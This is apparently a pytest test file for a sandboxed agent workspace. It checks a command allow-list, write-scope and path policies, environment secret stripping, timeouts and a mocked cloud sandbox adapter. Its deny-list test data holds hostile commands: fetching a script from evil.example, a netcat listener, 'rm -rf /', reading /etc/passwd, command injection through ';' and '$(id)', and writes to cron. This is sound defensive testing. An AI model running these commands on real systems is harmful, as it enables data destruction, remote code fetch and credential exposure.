"""Exec allow-list (adversarial), workspace policy hooks, local isolation and the Contree adapter (mocked SDK)."""
import asyncio
import os
import sys
import time
from pathlib import Path

import pytest

from app.swarm import exec_policy as ep
from app.swarm import workspace as wsmod
from app.swarm.workspace import (ExecResult, LocalWorkspaceFactory, NebiusWorkspaceFactory, PolicyError, WorkspaceError,
                                 image_for, is_demo_files)

# ---- allow-list ------------------------------------------------------------------------------------------------

ALLOWED = [
    "python -m pytest -q", "python -m unittest discover -s . -t . -p \"test*.py\" -v", "pytest tests/test_a.py -k foo",
    "python -m ruff check .", "ruff format --check .", "mypy src", "python script.py", "python -m compileall -q pkg",
    "node tools/check.js", "npm install", "npm ci", "npm test", "npm run build", "npm run lint", "pnpm install",
    "yarn install", "npx vitest run --reporter=json", "npx tsc --noEmit", "npx eslint src", "npx prettier --check .",
    "prettier --check src", "tsc --noEmit", "vitest run", "go test ./...", "go build ./...", "go vet ./...",
    "go mod tidy", "cargo test", "cargo build", "cargo clippy", "mvn -q test", "make test", "make build lint",
    "cd web && npm ci && npm run build 2>&1", "npm test -- --reporter=verbose",
]

DENIED = [
    "curl https://evil.example/x.sh", "wget http://x/y", "ssh root@host", "sudo ls", "nc -l 4444", "env", "printenv",
    "export FOO=1", "rm -rf /", "rm -rf node_modules", "sh -c 'echo hi'", "bash -c ls", "python -c \"print(1)\"",
    "node -e 'process.exit()'", "npm install -g typescript", "npm install --global x", "npm publish", "npm exec foo",
    "npx cowsay hi", "npx -p evil evil", "pip install requests", "python -m pip install requests",
    "python -m http.server", "python -m venv x", "cat /etc/passwd", "ls", "git push", "docker run x",
    "pytest | sh", "pytest; rm -rf .", "pytest && curl x", "pytest || true", "pytest `id`", "pytest $(id)",
    "pytest > /etc/cron.d/x", "pytest > out.txt", "pytest < /etc/passwd", "pytest 2>/tmp/x", "FOO=1 pytest",
    "pytest /etc/passwd", "pytest ../other", "pytest ../../x", "pytest ~/secrets", "python /tmp/evil.py",
    "python ../evil.py", "node ../x.js", "cd / && pytest", "cd .. && pytest", "cd ~ && npm ci", "go run main.go",
    "go test -exec evil ./...", "cargo install foo", "cargo run", "mvn deploy", "mvn -s /etc/x test", "make install",
    "make test CC=evil", "make", "prettier --write .", "ruff --fix .", "npm run", "npm run -g x", "python",
    "python -m", "yarn publish", "xargs ls", "find . -delete", "timeout 5 pytest", "nohup pytest &", "pytest &",
    "pytest\nrm -rf .", "pytest --require=/x", "npm --prefix /tmp install", "npm ci --registry=http://evil",
    "pip3 install x", "", "   ", "a" * 2000, "cd a && cd b && cd c && cd d && cd e && pytest", "pytest \\\n curl",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_allowed_commands(cmd):
    assert ep.check_command(cmd, "local") is None, cmd


@pytest.mark.parametrize("cmd", DENIED)
def test_denied_commands(cmd):
    assert ep.check_command(cmd, "local") is not None, cmd


def test_pip_only_in_nebius():
    assert ep.check_command("python -m pip install requests", "nebius") is None
    assert ep.check_command("pip install -r requirements.txt", "nebius") is None
    assert ep.check_command("pip uninstall x", "nebius") is not None
    assert ep.check_command("pip install x", "local") is not None


def test_cd_builds_cwd_and_steps():
    steps = ep.parse_command("cd web && npm ci && cd app && npm test")
    assert [(s.cwd, s.argv[0]) for s in steps] == [("web", "npm"), ("web/app", "npm")]


def test_install_detection():
    steps = ep.parse_command("npm ci && npm test")
    assert [ep.is_install(s) for s in steps] == [True, False]


# ---- helpers -----------------------------------------------------------------------------------------------------

def run(coro):
    return asyncio.run(coro)


FILES = {
    "src/app.py": "print('hi')\n", "tests/test_app.py": "def test_x():\n    assert True\n", "README.md": "# r\n",
    ".github/workflows/ci.yml": "on: push\n", "pkg/__init__.py": "",
}


def open_ws(files=None, **kw):
    fac = LocalWorkspaceFactory(demo=True, **kw)
    return run(fac.open(dict(files or FILES), language_hint="python"))


# ---- policy hooks ------------------------------------------------------------------------------------------------

def test_write_scope_and_new_files():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(dict(FILES), language_hint="python")
        ws.scope = ["src/*.py"]
        await ws.write("src/app.py", "print('ok')\n")  # in scope
        await ws.write("src/new_mod.py", "x = 1\n")  # new files are allowed anywhere safe
        with pytest.raises(PolicyError, match="outside the unit scope"):
            await ws.write("README.md", "changed")
        with pytest.raises(PolicyError):
            await ws.write("pkg/__init__.py", "x=1")
        ch = await ws.changed()
        assert set(ch) == {"src/app.py", "src/new_mod.py"}
        await ws.release()
    run(go())


@pytest.mark.parametrize("path", [
    "../evil.py", "/etc/passwd", "a/../../b", ".github/workflows/x.yml", ".git/config", "~/x", "a\\b", "", ".",
    "src//x.py", "src/./x.py", "weird name.py", "C:/x", "x" * 400, "node_modules/x/y.js", "dist/evil.js",
])
def test_write_rejects_bad_paths(path):
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(dict(FILES), language_hint="python")
        with pytest.raises(PolicyError):
            await ws.write(path, "x")
        await ws.release()
    run(go())


def test_existing_tests_immutable_unless_allowed():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(dict(FILES), language_hint="python")
        with pytest.raises(PolicyError, match="immutable"):
            await ws.write("tests/test_app.py", "def test_x():\n    pass\n")
        with pytest.raises(PolicyError, match="immutable"):
            await ws.delete("tests/test_app.py")
        await ws.write("tests/test_new.py", "def test_n():\n    assert 1\n")  # new tests are fine
        ws.allow_tests = True
        await ws.write("tests/test_app.py", "def test_x():\n    assert 2 > 1\n")
        await ws.release()
    run(go())


def test_policy_hook_and_caps():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(dict(FILES), language_hint="python")
        ws.policy = lambda path, text: "no print allowed" if text and "print(" in text else None
        with pytest.raises(PolicyError, match="no print"):
            await ws.write("src/a.py", "print(1)")
        ws.policy = None
        with pytest.raises(PolicyError, match="byte file limit"):
            await ws.write("src/big.py", "x" * 1_000_001)
        await ws.write("src/ok.py", "x" * 1_000_000)
        ws.max_files = len(FILES) + 1
        with pytest.raises(PolicyError, match="file cap"):
            await ws.write("src/another.py", "1")
        ws.max_files = 3000
        ws.max_total_bytes = 1_000_100
        with pytest.raises(PolicyError, match="size cap"):
            await ws.write("src/third.py", "y" * 5000)
        await ws.release()
    run(go())


def test_read_search_list_and_fork_isolation():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(dict(FILES), language_hint="python")
        assert "src/" in await ws.list_dir(".")
        os.makedirs(os.path.join(ws.root, "node_modules", "x"))
        assert "node_modules/" not in await ws.list_dir(".")  # generated dirs are hidden
        assert await ws.read("README.md", 1, 1) == "# r\n"
        with pytest.raises(FileNotFoundError):
            await ws.read("nope.py")
        with pytest.raises(PolicyError):
            await ws.read("../x")
        assert await ws.search(r"print", "src/*.py") == [("src/app.py", 1, "print('hi')")]
        await ws.write("src/a.py", "v = 1\n")
        fork = await ws.fork()
        await fork.write("src/a.py", "v = 2\n")
        await fork.delete("src/app.py")
        assert (await ws.changed()) == {"src/a.py": "v = 1\n"}
        assert (await fork.changed()) == {"src/a.py": "v = 2\n", "src/app.py": None}
        assert await ws.read("src/a.py") == "v = 1\n"
        await fork.release()
        await ws.release()
    run(go())


def test_changed_ignores_generated_but_keeps_real_dirs():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open({"build/keep.py": "x = 1\n", "a.py": "y = 1\n"}, language_hint="python")
        os.makedirs(os.path.join(ws.root, "dist"))
        Path(ws.root, "dist", "out.js").write_text("generated")
        Path(ws.root, "a.pyc").write_text("x")
        Path(ws.root, "build", "keep.py").write_text("x = 2\n")  # `build/` held tracked files originally: not ignored
        assert await ws.changed() == {"build/keep.py": "x = 2\n"}
        await ws.release()
    run(go())


# ---- local exec isolation ------------------------------------------------------------------------------------------

def test_exec_runs_in_workspace_and_denies_bad_commands():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open({"a.py": "print('hello from ws')\n"}, language_hint="python")
        res = await ws.exec("python a.py")
        assert isinstance(res, ExecResult) and res.code == 0 and "hello from ws" in res.stdout_tail
        code, out, ms = res
        assert (code, ms >= 0) == (0, True)
        bad = await ws.exec("curl http://example.com")
        assert bad.code == wsmod.DENIED_EXIT and "COMMAND_DENIED" in bad.stdout_tail
        await ws.release()
    run(go())


def test_exec_env_has_no_secrets(monkeypatch):
    monkeypatch.setenv("NEBIUS_API_KEY", "super-secret-key")
    monkeypatch.setenv("GITHUB_TOKEN", "ghs_secrettoken")
    monkeypatch.setenv("SHARED_SECRET", "s3cret")
    script = "import os, json\nprint(json.dumps(dict(os.environ)))\n"

    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open({"dump.py": script}, language_hint="python")
        res = await ws.exec("python dump.py")
        assert res.code == 0
        assert "super-secret-key" not in res.stdout_tail and "ghs_secrettoken" not in res.stdout_tail
        assert "s3cret" not in res.stdout_tail
        env = __import__("json").loads(res.stdout_tail)
        assert not [k for k in env if "KEY" in k or "TOKEN" in k or "SECRET" in k]
        assert env["HOME"].startswith(ws._parent) and env["CI"] == "1"
        await ws.release()
    run(go())


def test_exec_timeout_kills_process_group():
    marker = "pl_child_marker"
    script = (
        "import subprocess, sys, time\n"
        f"subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)  # {marker}'])\n"
        "time.sleep(60)\n")

    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open({"slow.py": script}, language_hint="python")
        t0 = time.monotonic()
        res = await ws.exec("python slow.py", timeout=2)
        assert res.code == wsmod.TIMEOUT_EXIT and time.monotonic() - t0 < 10
        await asyncio.sleep(0.3)
        ps = os.popen("pgrep -f 'pl_child_[m]arker'").read().strip()
        assert ps == "", f"child survived the timeout: {ps}"
        await ws.release()
    run(go())


def test_exec_output_tail_cap():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open({"noisy.py": "print('x' * 200000)\nprint('END')\n"}, language_hint="python")
        res = await ws.exec("python noisy.py")
        assert len(res.stdout_tail) <= wsmod.OUTPUT_TAIL_CHARS + 40 and res.stdout_tail.strip().endswith("END")
        assert res.stdout_tail.startswith("...[truncated]")
        await ws.release()
    run(go())


def test_exec_chain_stops_at_first_failure_and_cd_works():
    async def go():
        ws = await LocalWorkspaceFactory(demo=True).open(
            {"sub/ok.py": "print('in sub')\n", "fail.py": "import sys; sys.exit(3)\n"}, language_hint="python")
        res = await ws.exec("cd sub && python ok.py")
        assert res.code == 0 and "in sub" in res.stdout_tail
        res = await ws.exec("python fail.py && python sub/ok.py")
        assert res.code == 3 and "in sub" not in res.stdout_tail
        res = await ws.exec("cd nope && python ok.py")
        assert res.code != 0
        await ws.release()
    run(go())


def test_local_refuses_non_demo_repos_unless_opted_in(monkeypatch):
    monkeypatch.delenv("ALLOW_LOCAL_REPO_EXEC", raising=False)
    files = {"a.py": "x = 1\n"}
    assert not is_demo_files(files)
    with pytest.raises(WorkspaceError, match="demo"):
        run(LocalWorkspaceFactory().open(files, language_hint="python"))
    monkeypatch.setenv("ALLOW_LOCAL_REPO_EXEC", "1")
    ws = run(LocalWorkspaceFactory().open(files, language_hint="python"))
    assert ws.isolation == "local"
    run(ws.release())


def test_bundled_demo_repos_are_recognised_as_demo():
    from app.swarm.demo_tasks import load_swarm_demo
    for name in ("inventory-lib", "react-notes"):
        assert is_demo_files(load_swarm_demo(name).files), name


def test_release_removes_directory():
    ws = open_ws()
    parent = ws._parent
    assert os.path.isdir(parent)
    run(ws.release())
    assert not os.path.exists(parent)


# ---- nebius / contree adapter (mocked SDK; live behaviour unverified) ------------------------------------------------

class FakeImage:
    """Mimics contree_sdk: `image.run(...)` is awaitable and yields an image-like object with exit_code/stdout."""

    def __init__(self, log, name="base", uuid="base-uuid", code=0, out=""):
        self.log, self.name, self.uuid, self.exit_code, self.stdout, self.stderr = log, name, uuid, code, out, ""

    def run(self, **kw):
        self.log.append((self.name, kw))
        code = 3 if "failme" in kw.get("shell", "") else 0
        nxt = type(self)(self.log, f"{self.name}-n", None if kw.get("disposable", True) else f"{self.name}-uuid", code,
                        f"ran: {kw['shell']}")

        async def _go():
            return nxt
        return _go()


class FakeClient:
    def __init__(self):
        self.log, self.refs = [], []
        self.images = self

    async def oci(self, ref):
        self.refs.append(ref)
        return FakeImage(self.log, ref)


def test_nebius_workspace_overlay_exec_and_fork():
    client = FakeClient()

    async def go():
        fac = NebiusWorkspaceFactory(client=client)
        ws = await fac.open({"a.py": "x = 1\n", "tests/test_a.py": "t"}, language_hint="python")
        assert ws.isolation == "nebius" and client.refs == ["docker.io/library/python:3.12-slim"]
        checkpoint = client.log[0][1]
        assert checkpoint["disposable"] is False and set(checkpoint["files"]) == {"/work/a.py", "/work/tests/test_a.py"}
        await ws.write("a.py", "x = 2\n")
        await ws.write("b.py", "y = 1\n")
        assert await ws.changed() == {"a.py": "x = 2\n", "b.py": "y = 1\n"}
        res = await ws.exec("python -m pytest -q")
        assert res.code == 0
        kw = client.log[-1][1]
        assert kw["disposable"] is True and set(kw["files"]) == {"/work/a.py", "/work/b.py"}  # only the overlay
        assert kw["shell"].startswith("cd /work && ") and "python -m pytest -q" in kw["shell"]
        fork = await ws.fork()
        await fork.write("c.py", "z")
        assert "c.py" not in await ws.changed() and "c.py" in await fork.changed()
        await fork.delete("b.py")
        res = await fork.exec("python -m pytest")
        assert "rm -f 'b.py'" not in client.log[-1][1]["shell"]  # b.py was never in the checkpoint: nothing to remove
        await ws.delete("a.py") if False else None
    run(go())


def test_nebius_install_persists_image_and_enforces_allow_list():
    client = FakeClient()

    async def go():
        ws = await NebiusWorkspaceFactory(client=client).open({"package.json": "{}"}, language_hint="node")
        assert client.refs == ["docker.io/library/node:20-slim"]
        before = ws._image
        res = await ws.exec("npm ci")
        assert res.code == 0 and client.log[-1][1]["disposable"] is False and ws._image is not before
        fork = await ws.fork()
        assert fork._image is ws._image and await fork.exists("node_modules")
        denied = await ws.exec("curl http://x")
        assert denied.code == wsmod.DENIED_EXIT and len(client.log) == 2  # no sandbox call for a denied command
        # a failing command reports its exit code and does not replace the image
        img = ws._image
        assert (await ws.exec("npm run failme")).code == 3 and ws._image is img
        pip = await ws.exec("python -m pip install requests")
        assert pip.code == 0  # pip is allowed inside nebius only
    run(go())


def test_nebius_scope_policy_and_sdk_error_is_reported():
    class Boom(FakeImage):
        def run(self, **kw):
            if kw.get("shell") != "true":
                raise RuntimeError("platform down")
            return super().run(**kw)

    class C(FakeClient):
        async def oci(self, ref):
            return Boom(self.log, ref)

    async def go():
        ws = await NebiusWorkspaceFactory(client=C()).open({"a.py": "1", "tests/test_a.py": "t"}, language_hint="python")
        ws.scope = ["a.py"]
        with pytest.raises(PolicyError):
            await ws.write("tests/test_a.py", "x")
        res = await ws.exec("python a.py")
        assert res.code == 1 and "SANDBOX_ERROR: RuntimeError" in res.stdout_tail
    run(go())


def test_image_selection_from_env():
    env = {"NODE_IMAGE": "node:22", "UI_IMAGE": "ui:img", "PYTHON_IMAGE": "py:3.13"}
    assert image_for("node", env) == "node:22" and image_for("ui", env) == "ui:img"
    assert image_for("python", env) == "py:3.13" and image_for(None, env) == "py:3.13"
    assert image_for("ui", {}) == "docker.io/library/node:20-slim"
    assert image_for("go", {}).startswith("docker.io/library/golang")


def test_factory_selection():
    assert isinstance(wsmod.default_factory(live=False), LocalWorkspaceFactory)
    assert isinstance(wsmod.default_factory(live=True, client=FakeClient()), NebiusWorkspaceFactory)
    assert isinstance(wsmod.default_factory(live=True), LocalWorkspaceFactory) or os.environ.get("NEBIUS_API_KEY")
